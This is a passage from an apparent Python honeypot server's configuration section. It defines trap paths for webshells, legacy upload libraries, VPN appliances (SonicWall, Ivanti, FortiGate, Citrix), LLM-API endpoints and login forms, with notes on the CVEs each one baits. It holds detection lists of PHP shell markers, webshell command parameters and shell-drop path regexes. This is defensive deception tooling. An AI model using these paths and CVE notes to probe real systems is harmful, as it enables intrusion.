#!/usr/bin/env python3
from __future__ import annotations

import asyncio
import base64
import bz2
import gzip
import hashlib
import io
import json
import lzma
import os
import re
import secrets
import string
import sys
import tarfile
import time
import uuid
import zipfile
import zlib
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Callable
from urllib.parse import parse_qs, quote, unquote

import aiohttp
from aiohttp import web


API_BASE_URL = (os.environ.get("TRACEBIT_API_BASE_URL", "https://community.tracebit.com") or "https://community.tracebit.com").rstrip("/")
API_KEY = (os.environ.get("TRACEBIT_API_KEY") or "").strip()
SENSOR_ID = (os.environ.get("SENSOR_ID") or "").strip()
CANARY_TYPES = [
    value.strip()
    for value in (os.environ.get("TRACEBIT_ENV_CANARY_TYPES_CSV") or "aws,gitlab-username-password").split(",")
    if value.strip()
]
TRACEBIT_SOURCE = (os.environ.get("TRACEBIT_ENV_CANARY_SOURCE") or "flux").strip()
TRACEBIT_SOURCE_TYPE = (os.environ.get("TRACEBIT_ENV_CANARY_SOURCE_TYPE") or "endpoint").strip()
LOG_PATH = Path(os.environ.get("TRACEBIT_ENV_LOG_PATH") or "/var/log/honeypot/tracebit/env-canary.jsonl")
TARPIT_ENABLED = (os.environ.get("TRACEBIT_ENV_TARPIT_ENABLED") or "true").strip().lower() in {"1", "true", "yes", "on"}
TARPIT_SECONDS = max(int((os.environ.get("TRACEBIT_ENV_TARPIT_SECONDS") or "0").strip() or "0"), 0)
TARPIT_CHUNK_BYTES = max(int((os.environ.get("TRACEBIT_ENV_TARPIT_CHUNK_BYTES") or "32").strip() or "32"), 1)
TARPIT_INTERVAL_MS = max(int((os.environ.get("TRACEBIT_ENV_TARPIT_INTERVAL_MS") or "2000").strip() or "2000"), 100)
# Default sized for the async event loop, not a thread pool: each held
# drip is ~8 KB of coroutine state, not an OS thread. 256 is a safe
# ceiling on a 1 GB VM; raise it if scanners ever trip this.
TARPIT_MAX_CONNECTIONS = max(int((os.environ.get("TRACEBIT_ENV_TARPIT_MAX_CONNECTIONS") or "256").strip() or "256"), 1)
_active_slow_drips = 0  # tarpit + fake-git share this cap; bumped per event loop (single-threaded).
HEADER_VALUE_LOG_LIMIT = 512
LOG_HEADER_NAMES = "Host,X-Forwarded-Host,X-Forwarded-For,X-Forwarded-Proto,True-Client-Ip,X-Real-Ip,X-Client-Ip,X-Azure-Clientip,X-Azure-Socketip,X-Originating-Ip,X-Host,Cf-Connecting-Ip,Content-Type,Content-Length".split(",")

# --- Tarpit module configuration ---
# Defaults are ON — flux is a honeypot, the whole point is to fingerprint.
# To disable an individual module, set its env var to "false" / "0".
# DNS callback is a partial exception: enabled by default but a no-op
# unless TARPIT_MOD_DNS_CALLBACK_DOMAIN is also set, since redirecting
# to an empty domain produces garbage URLs.
def _env_bool(name: str, default: bool = True) -> bool:
    raw = (os.environ.get(name) or "").strip().lower()
    if raw == "":
        return default
    return raw in {"1", "true", "yes", "on"}

MOD_DNS_CALLBACK_ENABLED = _env_bool("TARPIT_MOD_DNS_CALLBACK_ENABLED")
MOD_DNS_CALLBACK_DOMAIN = (os.environ.get("TARPIT_MOD_DNS_CALLBACK_DOMAIN") or "").strip()
MOD_COOKIE_ENABLED = _env_bool("TARPIT_MOD_COOKIE_ENABLED")
MOD_REDIRECT_CHAIN_ENABLED = _env_bool("TARPIT_MOD_REDIRECT_CHAIN_ENABLED")
MOD_REDIRECT_CHAIN_MAX_HOPS = max(int((os.environ.get("TARPIT_MOD_REDIRECT_CHAIN_MAX_HOPS") or "5").strip() or "5"), 1)
MOD_VARIABLE_DRIP_ENABLED = _env_bool("TARPIT_MOD_VARIABLE_DRIP_ENABLED")
MOD_VARIABLE_DRIP_INITIAL_MS = max(int((os.environ.get("TARPIT_MOD_VARIABLE_DRIP_INITIAL_MS") or "500").strip() or "500"), 50)
MOD_VARIABLE_DRIP_MAX_MS = max(int((os.environ.get("TARPIT_MOD_VARIABLE_DRIP_MAX_MS") or "16000").strip() or "16000"), 100)
MOD_CONTENT_LENGTH_MISMATCH_ENABLED = _env_bool("TARPIT_MOD_CONTENT_LENGTH_MISMATCH_ENABLED")
MOD_CONTENT_LENGTH_CLAIMED_BYTES = max(int((os.environ.get("TARPIT_MOD_CONTENT_LENGTH_CLAIMED_BYTES") or "1048576").strip() or "1048576"), 1024)
MOD_ETAG_PROBE_ENABLED = _env_bool("TARPIT_MOD_ETAG_PROBE_ENABLED")

# --- Generic fingerprint paths ---
# The fingerprinting modules (cookie, etag, dns-callback, redirect-chain,
# drip, content-length-mismatch) were originally only invoked on `.env`
# variants. Scanners that aren't hunting `.env` never tripped them. This
# list routes the same module chain at a set of generic paths a scanner
# typically hits on first contact.
_FINGERPRINT_DEFAULT_PATHS = ",".join([
    "/",
    "/index.html",
    "/index.php",
    "/robots.txt",
    "/sitemap.xml",
    "/favicon.ico",
])
FINGERPRINT_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("FINGERPRINT_PATHS_CSV") or _FINGERPRINT_DEFAULT_PATHS).split(",")
    if value.strip()
}
FINGERPRINT_PATHS_ENABLED = _env_bool("FINGERPRINT_PATHS_ENABLED")

# --- Fake /.git/ tree configuration ---
# Default-on: flux is a honeypot, and the /.git/ tree is one of the most
# valuable traps we have. The per-IP cache (FAKE_GIT_CACHE_TTL_SECONDS)
# keeps scanner fan-out from burning Tracebit quota, and the dispatch
# still requires TRACEBIT_API_KEY to be set (see server.py:2559) — so
# deployments without a key stay 404 regardless of this default.
FAKE_GIT_ENABLED = _env_bool("FAKE_GIT_ENABLED")
FAKE_GIT_CACHE_TTL_SECONDS = max(int((os.environ.get("FAKE_GIT_CACHE_TTL_SECONDS") or "3600").strip() or "3600"), 60)
FAKE_GIT_CACHE_MAX_ENTRIES = max(int((os.environ.get("FAKE_GIT_CACHE_MAX_ENTRIES") or "1024").strip() or "1024"), 16)
FAKE_GIT_DRIP_BYTES = max(int((os.environ.get("FAKE_GIT_DRIP_BYTES") or "1024").strip() or "1024"), 32)
FAKE_GIT_DRIP_INTERVAL_MS = max(int((os.environ.get("FAKE_GIT_DRIP_INTERVAL_MS") or "3000").strip() or "3000"), 100)
FAKE_GIT_AUTHOR = (os.environ.get("FAKE_GIT_AUTHOR") or "ops <ops@internal-tools.lan>").strip()
FAKE_GIT_COMMIT_MESSAGE = (os.environ.get("FAKE_GIT_COMMIT_MESSAGE") or "Initial import of internal-tools").strip()
# If FAKE_GIT_REMOTE_URL is set, it's used verbatim (operator override).
# If unset, the URL is built per-request from the Tracebit canary creds
# issued for this fake repo, so that scrapers who just grep `.git/config`
# (without running `git clone`) still leak a canary credential — the URL
# userinfo is a real Tracebit access key, and any attempt to use it as AWS
# credentials triggers a Tracebit callback. This is a distinct tripwire
# from the `git clone`-then-read-secrets.yml path the rest of the trap
# already covers: some scanning fleets observed in the wild fetch
# `.git/config` in isolation and never progress to a full clone.
FAKE_GIT_REMOTE_URL = (os.environ.get("FAKE_GIT_REMOTE_URL") or "").strip()
FAKE_GIT_REMOTE_HOST = (os.environ.get("FAKE_GIT_REMOTE_HOST") or "github.com").strip()
FAKE_GIT_REMOTE_PATH = (os.environ.get("FAKE_GIT_REMOTE_PATH") or "internal/tools.git").strip().lstrip("/")

# --- Fake webshell configuration (Azure WP Webshell Checker intel, 2026-04-20) ---
# Default-enabled: the trap is cheap, logs are cheap, and we want to see what
# commands the checker follows up with on a positive hit.
WEBSHELL_ENABLED = (os.environ.get("HONEYPOT_WEBSHELL_ENABLED") or "true").strip().lower() in {"1", "true", "yes", "on"}
# Paths known to be probed by scanners looking for pre-existing PHP shells to
# take over — the "shell jacking" pattern (probe candidate paths someone else
# dropped, inherit their persistence) as well as the Azure WP Webshell Checker
# lineage. Overridable via env for quick additions without a republish.
_WEBSHELL_DEFAULT_PATHS = ",".join([
    # Anchor: the hellopress / wp-file-manager planted shell (CVE-2020-25213 lineage)
    "/wp-content/plugins/hellopress/wp_filemanager.php",
    "/hellopress/wp_filemanager.php",
    "/wp_filemanager.php",
    # Short-named PHP shells observed in the 2026-04-20 Azure WP checker burst
    "/doc.php", "/ws80.php", "/bthil.php", "/xminie.php",
    "/inputs.php", "/ioxi-o.php", "/8.php", "/an.php",
    "/kma.php", "/ssh3ll.php", "/new4.php", "/sf.php",
    # Common generic PHP webshell names
    "/shell.php", "/cmd.php", "/c.php", "/up.php", "/upload.php",
    # Named-shell filenames seen as follow-on probes from the same
    # post-compromise fleet (webshell-jacking intel). Grouped by shape:
    #   - single-digit / short numeric names
    "/0.php", "/0x.php", "/1.php", "/7.php", "/12.php", "/222.php", "/404.php",
    "/a.php", "/a1.php",
    #   - generic-shell-looking filenames observed as 404s across sensors
    "/aa.php", "/abcd.php", "/about.php", "/aboute.php", "/adminfuns.php",
    "/as.php", "/autoload_classmap.php", "/av.php", "/chosen.php",
    "/classwithtostring.php", "/dass.php", "/db.php", "/dx.php", "/edit.php",
    "/eetu.php", "/f35.php", "/fs.php", "/gifclass.php", "/lib.php",
    "/ms-edit.php", "/press.php", "/rip.php", "/sid3.php", "/sql.php",
    "/themes.php", "/y.php",
    #   - "ws<N>" numbered series (already had ws80; fleet probes ~50-99)
    "/ws57.php", "/ws66.php", "/ws81.php", "/ws82.php",
    #   - wp-themed backdoor filenames (not real WP core files)
    "/wp-block.php", "/wp-good.php", "/wp-kikikoko.php",
    #   - non-.php backdoors ("dr0v" is a specific observed marker name)
    "/dr0v",
    #   - "style.php" webshell-jacking family (active since Jan 2026):
    #     dedicated single-path checker fleet renames its eval(...) shell
    #     `style.php` and probes both the bare root and the four standard
    #     WordPress directory prefixes. Real WP serves style.css, never
    #     style.php — any 200 here is the scanner's confirmation signal.
    #     Same handler returns the fake login + simulates command output
    #     when a follow-on `?cmd=` lands.
    "/style.php",
    "/wp-style.php",
    "/wp-admin/style.php",
    "/wp-content/style.php",
    "/wp-content/themes/style.php",
    "/wp-includes/style.php",
    "/js/style.php",
])
WEBSHELL_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_WEBSHELL_PATHS_CSV") or _WEBSHELL_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Regex families for webshell paths that are parameterized and therefore can't
# be enumerated as literal strings. Two observed shapes:
#   - `/.well-known/<name>.php` — attackers abuse the writable acme-challenge
#     area as a shell-drop directory (certbot can create files there as root).
#     Names seen in the wild: rk2.php (r57 lineage), gecko-litespeed.php,
#     admin.php, error.php, index.php. The legitimate `/.well-known/acme-challenge/*`
#     path is excluded by nginx routing (see cloud-init-sensor template), so
#     we don't need to special-case it here.
#   - `/.trash<N>/` and `/.tmb/` — numbered "trash" directories and tmb/ staging
#     paths used by specific malware families as shell-drop locations.
#     `/.tresh/` (typo'd variant) is included via literal list only if seen.
_WEBSHELL_PATH_REGEXES: tuple[re.Pattern[str], ...] = (
    re.compile(r"^/\.well-known/[^/]+\.php$", re.IGNORECASE),
    re.compile(r"^/\.trash\d+/", re.IGNORECASE),
    re.compile(r"^/\.tmb/[^/]+\.php$", re.IGNORECASE),
    re.compile(r"^/\.(tresh|dj|alf|mopj|info)(/|\.php$)", re.IGNORECASE),
)
# Bound the body we decode+log. Scanners can POST large payloads; we still
# want body_sha256 for everything but only need a prefix of decoded content
# to see command strings.
WEBSHELL_BODY_DECODE_LIMIT = max(int((os.environ.get("HONEYPOT_WEBSHELL_BODY_DECODE_LIMIT") or "8192").strip() or "8192"), 512)
# Max body size to actually read off the wire (prevents a slowloris-style
# upload from pinning a handler thread forever).
WEBSHELL_BODY_READ_LIMIT = max(int((os.environ.get("HONEYPOT_WEBSHELL_BODY_READ_LIMIT") or "65536").strip() or "65536"), 1024)
# Param names commonly used by PHP webshells to smuggle commands. Ordered
# by frequency in the wild; first hit wins.
WEBSHELL_COMMAND_KEYS = (
    "cmd", "c", "command", "exec", "e", "x",
    "pass", "password", "key", "p", "execute",
    "do", "run", "shell", "act", "action", "q", "query",
)
WEBSHELL_COMMAND_HEADERS = ("X-Cmd", "X-Exec", "X-Command")

# --- File-upload responder (KCFinder / jquery.filer / blueimp jQuery File Upload) ---
# Scanners that look for legacy PHP file-upload libraries walk a long list
# of webroot prefix variants — `/kcfinder/upload.php`,
# `/admin/ckeditor/plugins/kcfinder/upload.php`, `/assets/plugins/kcfinder/`,
# `/jquery-file-upload/server/php/`, `/assets/plugins/jquery.filer/php/`,
# etc. — looking for an endpoint that will accept an arbitrary `<?php`
# upload. The corresponding CVEs are long-standing arbitrary file upload
# bugs (KCFinder ≤ 3.20 CVE-2018-15706, jquery.filer pre-1.3.5 SDK
# vulnerabilities, Blueimp jQuery-File-Upload < 9.22.1 CVE-2018-9206).
# Default-on like webshell: the trap is cheap, logs are cheap, the
# value is the POST body. The handler returns a plausible "ready"
# response on GET and a plausible "uploaded" response on POST so the
# scanner sends its actual exploit body; we capture multipart filenames
# + content-types + a body preview + a flag for embedded `<?php` markers.
FILE_UPLOAD_ENABLED = _env_bool("HONEYPOT_FILE_UPLOAD_ENABLED")
# Both matchers tolerate arbitrary leading directory prefixes so a single
# trap covers every observed `/<prefix>/(kcfinder|jquery.filer|...)/...`
# webroot variant without an enumeration list.
_FILE_UPLOAD_KCFINDER_RE = re.compile(
    r"^(?:/[^/]+)*/kcfinder/(?:upload|browse|kcfinder)\.php$",
    re.IGNORECASE,
)
_FILE_UPLOAD_JQFILER_RE = re.compile(
    r"^(?:/[^/]+)*/jquery\.filer/(?:php/)?(?:upload\.php|readme\.txt|index\.html)$",
    re.IGNORECASE,
)
# Blueimp jQuery File Upload — the historical `server/php/` directory is
# the actual upload handler. Trailing slash is what the scanners send.
_FILE_UPLOAD_BLUEIMP_RE = re.compile(
    r"^(?:/[^/]+)*/jquery-file-upload/server/php/?$",
    re.IGNORECASE,
)
FILE_UPLOAD_BODY_DECODE_LIMIT = max(
    int((os.environ.get("HONEYPOT_FILE_UPLOAD_BODY_DECODE_LIMIT") or "8192").strip() or "8192"),
    512,
)
# Cap the number of multipart parts we'll bother enumerating; long-tail
# multipart bodies past this point are still hashed via bodySha256 but
# don't get per-part fields in the log line.
FILE_UPLOAD_MAX_PARTS = max(
    int((os.environ.get("HONEYPOT_FILE_UPLOAD_MAX_PARTS") or "16").strip() or "16"),
    1,
)
# Indicators that a multipart part is a PHP shell payload — match on the
# raw part bytes (case-insensitive). Presence flips
# `fileUploadHasPhpShell` for fast triage; the body itself is hashed and
# (capped) decoded into `bodyPreview` regardless.
_FILE_UPLOAD_PHP_SHELL_INDICATORS = (
    b"<?php",
    b"<?=",
    b"<%@",
    b"eval(",
    b"system(",
    b"passthru(",
    b"shell_exec(",
    b"proc_open(",
    b"`",
)

# --- Fake web-application form responder ---------------------------------
# Multi-operator scanner fleets started bursting POSTs against generic web-app
# form paths in May 2026 — `/login`, `/signin`, `/signup`, `/checkout`,
# `/contact`, `/dashboard`, `/profile`, `/auth`, `/subscribe`, `/newsletter`,
# `/cart`, `/register`, `/settings`, `/admin` — alongside `.env` and `.git`
# probes. POST bodies are HTML form-encoded with per-request unique field
# values (no fixed payload), consistent with credential-stuffing or
# form-fuzzing tooling. Default flux currently 404s every one of these and
# the scanner walks away with nothing logged past the path. This trap
# returns a plausible HTML form on GET (with a per-request hidden CSRF
# token + session cookie so a follow-on POST looks credible) and a 302
# redirect on POST (auth-failure shape: most scanners interpret a redirect
# back to the form as "wrong credentials, try the next pair"), which
# elicits the rest of the credential rotation. We log the form field names,
# extracted username/email value (if any), and a body-preview / sha256 so
# every POST is auditable.
WEBAPP_FORM_ENABLED = _env_bool("HONEYPOT_WEBAPP_FORM_ENABLED")

# Organised by intent so the result tag carries useful classification.
# Each tuple: (result_suffix, paths). `_WEBAPP_FORM_DEFAULT_PATHS` is
# flattened for env-override; the per-path-to-suffix map is built once
# at import time.
_WEBAPP_FORM_LOGIN_PATHS = (
    "/login", "/signin", "/sign_in", "/sign-in", "/log-in", "/log_in",
    "/auth", "/auth/login", "/auth/signin", "/auth/sign_in", "/auth/sign-in",
    "/api/login", "/api/auth", "/api/signin", "/api/sign_in",
    "/account/login", "/account/signin", "/user/login", "/users/login",
    "/admin/login", "/admin/signin",
)
_WEBAPP_FORM_SIGNUP_PATHS = (
    "/signup", "/sign_up", "/sign-up", "/register",
    "/auth/signup", "/auth/sign_up", "/auth/sign-up", "/auth/register",
    "/api/signup", "/api/sign_up", "/api/register",
    "/account/register", "/account/signup", "/users/register", "/users/sign_up",
)
_WEBAPP_FORM_CHECKOUT_PATHS = (
    "/checkout", "/cart", "/cart/checkout", "/api/checkout", "/api/cart",
    "/order/checkout", "/orders/new",
)
_WEBAPP_FORM_CONTACT_PATHS = (
    "/contact", "/contact-us", "/contact_us", "/api/contact",
    "/subscribe", "/newsletter", "/api/subscribe", "/api/newsletter",
)
_WEBAPP_FORM_PROFILE_PATHS = (
    "/profile", "/account", "/settings", "/dashboard", "/admin",
    "/user/profile", "/users/profile", "/account/settings",
    "/api/profile", "/api/account", "/api/settings",
)
_WEBAPP_FORM_DEFAULT_GROUPS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("login",    _WEBAPP_FORM_LOGIN_PATHS),
    ("signup",   _WEBAPP_FORM_SIGNUP_PATHS),
    ("checkout", _WEBAPP_FORM_CHECKOUT_PATHS),
    ("contact",  _WEBAPP_FORM_CONTACT_PATHS),
    ("profile",  _WEBAPP_FORM_PROFILE_PATHS),
)
# Allow one operator override that just adds extra paths (mapped to the
# generic `form` suffix) without losing the per-group classification of
# the built-ins.
_WEBAPP_FORM_EXTRA_PATHS = tuple(
    p.strip().lower()
    for p in (os.environ.get("HONEYPOT_WEBAPP_FORM_EXTRA_PATHS_CSV") or "").split(",")
    if p.strip()
)
WEBAPP_FORM_PATH_SUFFIX: dict[str, str] = {}
for _suffix, _paths in _WEBAPP_FORM_DEFAULT_GROUPS:
    for _p in _paths:
        WEBAPP_FORM_PATH_SUFFIX[_p.lower()] = _suffix
for _p in _WEBAPP_FORM_EXTRA_PATHS:
    WEBAPP_FORM_PATH_SUFFIX.setdefault(_p, "form")
# Field names a credential-stuffing scanner is likely to populate. Parsed
# both as the form's `name=` attribute (so it's easier for naive scanners
# to bind) and as the body-side extraction list.
WEBAPP_FORM_USERNAME_KEYS = (
    "username", "user", "login", "email", "user_email", "userlogin",
    "log", "uname",
)
WEBAPP_FORM_PASSWORD_KEYS = (
    "password", "passwd", "pass", "pwd", "user_password", "credential",
)
WEBAPP_FORM_BODY_PREVIEW_LIMIT = max(int((os.environ.get("HONEYPOT_WEBAPP_FORM_BODY_PREVIEW_LIMIT") or "400").strip() or "400"), 64)

# --- Fake WordPress wp-login.php canary -----------------------------------
# WordPress credential-stuffing scanners hit /wp-login.php with a GET-then-
# POST pattern: GET to harvest _wpnonce + testcookie, POST with credentials.
# Returning a realistic login form with a per-hit unique _wpnonce lets us
# attribute the follow-up POST by whether it echoes the nonce (sophisticated
# tool that parses the GET) or blind-POSTs without it (naive tool).
WP_LOGIN_ENABLED = _env_bool("HONEYPOT_WP_LOGIN_ENABLED")
WP_LOGIN_BODY_PREVIEW_LIMIT = max(int((os.environ.get("HONEYPOT_WP_LOGIN_BODY_PREVIEW_LIMIT") or "400").strip() or "400"), 64)
WP_LOGIN_NONCE_CACHE_TTL = max(int((os.environ.get("HONEYPOT_WP_LOGIN_NONCE_CACHE_TTL") or "3600").strip() or "3600"), 60)
WP_LOGIN_NONCE_CACHE_MAX = max(int((os.environ.get("HONEYPOT_WP_LOGIN_NONCE_CACHE_MAX") or "1024").strip() or "1024"), 16)
WP_LOGIN_PATHS: set[str] = {"/wp-login.php"}
WP_LOGIN_ADMIN_PATHS: set[str] = {
    "/wp-admin/",
    "/wp-admin/index.php",
    "/wp-admin/admin.php",
    "/wp-admin/profile.php",
    "/wp-admin/admin-ajax.php",
    "/wp-admin/install.php",
}

# --- Fake LLM-API endpoint (Ollama / OpenAI / Anthropic-proxy shape) ---
# Motivated by scanner fleets observed probing AI-inference endpoints
# in April 2026 — Ollama-native paths, OpenAI-compatible paths, and
# corporate AI-proxy paths (`/anthropic/v1/models`) with non-overlapping
# HTTP-client fingerprints. The intel we want is what comes next —
# model name requested, prompt body, whether a bearer token is
# presented, UA rotation on a follow-up.
#
# Default-on like the webshell: the trap is cheap, logs are cheap, and a
# plausible response is what makes the scanner send its next command.
LLM_ENDPOINT_ENABLED = _env_bool("HONEYPOT_LLM_ENDPOINT_ENABLED")
# Paths served. All exact lowercase matches — same model as WEBSHELL_PATHS.
_LLM_ENDPOINT_DEFAULT_PATHS = ",".join([
    # Ollama + OpenAI-compatible listings
    "/v1/models",
    "/api/tags",
    "/api/version",
    "/api/ps",
    # Ollama POST endpoints
    "/api/chat",
    "/api/generate",
    "/api/show",
    # OpenAI POST
    "/v1/chat/completions",
    "/v1/completions",
    "/v1/embeddings",
    # Anthropic Messages API + corporate AI-proxy paths
    "/v1/messages",
    "/anthropic/v1/models",
    "/anthropic/v1/messages",
])
LLM_ENDPOINT_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_LLM_ENDPOINT_PATHS_CSV") or _LLM_ENDPOINT_DEFAULT_PATHS).split(",")
    if value.strip()
}
# Cap how much of the prompt body we decode into the log line. Scanners that
# find the endpoint may POST large system prompts or tool definitions; we want
# the first chunk (enough to see intent + model + a prompt prefix) without
# bloating the log file.
LLM_BODY_DECODE_LIMIT = max(int((os.environ.get("HONEYPOT_LLM_BODY_DECODE_LIMIT") or "4096").strip() or "4096"), 512)

# --- PHPUnit eval-stdin + body-carried RCE probes -----------------------
# The body-enabled access index showed the largest recent POST/GET-body
# cluster is PHPUnit CVE-2017-9841-style eval-stdin probes. The same pass
# surfaced Apache CGI path traversal `/bin/sh` bodies and PHP-CGI
# CVE-2024-4577 `auto_prepend_file=php://input` payloads. These are active
# exploitation attempts whose payload body is the signal; keep the responders
# small, log decoded command hints, and return the simple echo/md5 output many
# scanners use as their liveness check.
PHPUNIT_EVAL_ENABLED = _env_bool("HONEYPOT_PHPUNIT_EVAL_ENABLED")
BODY_RCE_ENABLED = _env_bool("HONEYPOT_BODY_RCE_ENABLED")
BODY_RCE_PREVIEW_LIMIT = max(int((os.environ.get("HONEYPOT_BODY_RCE_PREVIEW_LIMIT") or "512").strip() or "512"), 128)

# --- Fake SonicWall SSL VPN (CVE-2024-53704 bait chain) ------------------
# Two overlapping behaviour patterns observed in mid-April 2026:
#   - A dedicated SonicWall-precondition fleet hitting only
#     `/api/sonicos/is-sslvpn-enabled` — the CVE precondition check.
#   - A broader enterprise-appliance probe running the full three-step
#     sequence `is-sslvpn-enabled` → `auth` → `tfa` on every target.
#
# These paths are SonicWall-specific — no legitimate scanner hits them.
# The trap looks live enough (200 + plausible JSON) that the scanner
# sends its next step, which is where the actual intel is: what usernames
# they try, whether they present harvested session cookies, whether the
# TFA payload carries an exploit.
SONICWALL_ENABLED = _env_bool("HONEYPOT_SONICWALL_ENABLED")
_SONICWALL_DEFAULT_PATHS = ",".join([
    "/api/sonicos/is-sslvpn-enabled",
    "/api/sonicos/auth",
    "/api/sonicos/tfa",
])
SONICWALL_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_SONICWALL_PATHS_CSV") or _SONICWALL_DEFAULT_PATHS).split(",")
    if value.strip()
}

# --- Fake Cisco WebVPN + Secure Client launcher (CVE bait) ---------------
# Common scanner sequence seen in fleet telemetry:
#   /+CSCOE+/logon.html (landing page)
#   /+CSCOE+/logon_forms.js (JS helper)
#   /+CSCOL+/Java.jar and /+CSCOL+/a1.jar (legacy AnyConnect artifacts)
# Returning plausible content keeps the flow alive long enough to capture
# follow-on fetches and payload replay attempts.
CISCO_WEBVPN_ENABLED = _env_bool("HONEYPOT_CISCO_WEBVPN_ENABLED")
_CISCO_WEBVPN_DEFAULT_PATHS = ",".join([
    "/+cscoe+/logon.html",
    "/+cscoe+/logon_forms.js",
    "/+cscol+/java.jar",
    "/+cscol+/a1.jar",
    "/+cscoe+/portal.html",
])
CISCO_WEBVPN_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_CISCO_WEBVPN_PATHS_CSV") or _CISCO_WEBVPN_DEFAULT_PATHS).split(",")
    if value.strip()
}

# --- Fake Ivanti Connect Secure / Pulse Secure VPN ----------------------
# Enterprise multi-scanner dictionaries added Ivanti-shaped paths in late
# April 2026, fingerprinting CVE-2023-46805 (auth bypass) +
# CVE-2024-21887 (command injection) + CVE-2025-22457 (stack overflow,
# active exploitation per CISA KEV) probe chains. Common URL families:
#   /dana-na/auth/url_default/welcome.cgi  — generic SSL VPN landing
#   /dana-na/auth/url_admin/welcome.cgi    — admin portal landing
#   /dana-na/auth/url_default/login.cgi    — POST credential endpoint
#   /dana-cached/hc/HostCheckerInstaller.* — HostChecker launcher assets
#   /dana-ws/namedusers                    — REST endpoint where the
#                                            CVE-2024-21887 cmdinjection
#                                            POST body lands
# Returning plausible HTML / JSON keeps the probe alive past banner-grab
# so the follow-on exploit body lands in `bodyPreview` / `bodySha256`.
IVANTI_VPN_ENABLED = _env_bool("HONEYPOT_IVANTI_VPN_ENABLED")
_IVANTI_VPN_DEFAULT_PATHS = ",".join([
    "/dana-na/auth/url_default/welcome.cgi",
    "/dana-na/auth/url_admin/welcome.cgi",
    "/dana-na/auth/welcome.cgi",
    "/dana-na/auth/url_default/login.cgi",
    "/dana-cached/hc/hostcheckerinstaller.osx",
    "/dana-cached/hc/hostcheckerinstaller.exe",
    "/dana-cached/hc/hostcheckerinstaller.dmg",
    "/dana-ws/namedusers",
])
IVANTI_VPN_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_IVANTI_VPN_PATHS_CSV") or _IVANTI_VPN_DEFAULT_PATHS).split(",")
    if value.strip()
}

# --- Fake IBM Aspera Faspex portal (CVE-2022-47986 bait) ----------------
# CMS expansion fleets started probing `/aspera/faspex/` in late April 2026.
# Real exploitation typically follows with a crafted POST to
# `/aspera/faspex/account/logout` (YAML deserialization in older releases).
# We return plausible HTML/JSON so scanners continue into the follow-on step,
# then capture method/query/body metadata for payload triage.
ASPERA_FASPEX_ENABLED = _env_bool("HONEYPOT_ASPERA_FASPEX_ENABLED")
_ASPERA_FASPEX_DEFAULT_PATHS = ",".join([
    "/aspera/faspex/",
    "/aspera/faspex",
    "/aspera/faspex/account/logout",
    "/aspera/faspex/package_relay/relay_package",
])
ASPERA_FASPEX_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_ASPERA_FASPEX_PATHS_CSV") or _ASPERA_FASPEX_DEFAULT_PATHS).split(",")
    if value.strip()
}
ASPERA_FASPEX_VERSION = (os.environ.get("HONEYPOT_ASPERA_FASPEX_VERSION") or "4.4.1").strip()

# --- Fake FortiGate SSL VPN (CVE-2024-21762 / CVE-2023-27997 bait) -------
# Multi-target VPN scanners started bundling FortiGate's `/remote/login` next
# to Cisco AnyConnect (`/+CSCOE+/logon.html`) and Microsoft RDP Web Access
# (`/RDWeb/Pages/`) probes in May 2026 — the FortiGate-specific path was the
# new addition. FortiOS SSL VPN exposes:
#   /remote/login                       — login landing (?lang=en is the
#                                         observed first-contact form)
#   /remote/logincheck                  — credential POST sink
#   /remote/fgt_lang                    — language pack stub fetched by the
#                                         JS on the login page
#   /remote/error                       — error redirect target
#   /api/v2/cmdb/system/admin           — REST admin enumeration (bait for
#                                         CVE-2024-48887 admin password
#                                         reset and post-auth chains)
#   /api/v2/monitor/router/policy       — REST monitor (post-auth fingerprint
#                                         used after login-page banner-grab
#                                         confirms a vulnerable build)
#   /api/v2/cmdb/system/status          — version / build banner
# Returning the FortiOS login HTML keeps banner-grab probes alive past the
# initial fingerprint so a follow-on CVE-2024-21762 (heap overflow,
# unauthenticated, CVSS 9.8) or CVE-2023-27997 (xortigate, heap overflow,
# unauthenticated, CVSS 9.8) body lands in the access log.
FORTIGATE_VPN_ENABLED = _env_bool("HONEYPOT_FORTIGATE_VPN_ENABLED")
_FORTIGATE_VPN_DEFAULT_PATHS = ",".join([
    "/remote/login",
    "/remote/logincheck",
    "/remote/fgt_lang",
    "/remote/error",
    "/api/v2/cmdb/system/admin",
    "/api/v2/cmdb/system/status",
    "/api/v2/cmdb/system/global",
    "/api/v2/monitor/router/policy",
])
FORTIGATE_VPN_PATHS = {
    value.strip().lower()
    for value in (os.environ.get("HONEYPOT_FORTIGATE_VPN_PATHS_CSV") or _FORTIGATE_VPN_DEFAULT_PATHS).split(",")
    if value.strip()
}
# FortiOS build advertised in the response. 7.4.4 is in the
# CVE-2024-21762 / CVE-2023-27997 vulnerable window.
FORTIGATE_VPN_VERSION = (os.environ.get("HONEYPOT_FORTIGATE_VPN_VERSION") or "7.4.4").strip()
FORTIGATE_VPN_BUILD = (os.environ.get("HONEYPOT_FORTIGATE_VPN_BUILD") or "2662").strip()

# --- Fake Citrix NetScaler / Gateway portal -----------------------------
# Multi-target VPN scanners pair `/vpn/index.html` and
# `/logon/LogonPoint/index.html` with FortiGate `/remote/login` and Cisco
# `/+CSCOE+/logon.html` probes. Both paths are the canonical Citrix
# Gateway / NetScaler ADC SSL VPN landing endpoints exploited by
# CVE-2019-19781 ("Shitrix"), CVE-2023-3519 (unauthenticated RCE via
# OAUTH config), and CVE-2023-4966 ("CitrixBleed", session-cookie leak).
# Less-common but observed: `/Citrix/XenApp/auth/login.aspx`
# (StoreFront/XenApp auth portal — CVE-2022-27510 auth bypass and
# CVE-2023-24486 session hijacking).
# Returning the portal HTML keeps banner-grab probes alive past the
# fingerprint and lets the credential POST + any path-traversal /
# session-replay body land in the access log. Per-request `NSC_AAAC`
# cookie matches the CitrixBleed leak shape — never a fixed literal.
CITRIX_GATEWAY_ENABLED = _env_bool("HONEYPOT_CITRIX_GATEWAY_ENABLED")
_CITRIX_GATEWAY_DEFAULT_PATHS = ",".join([
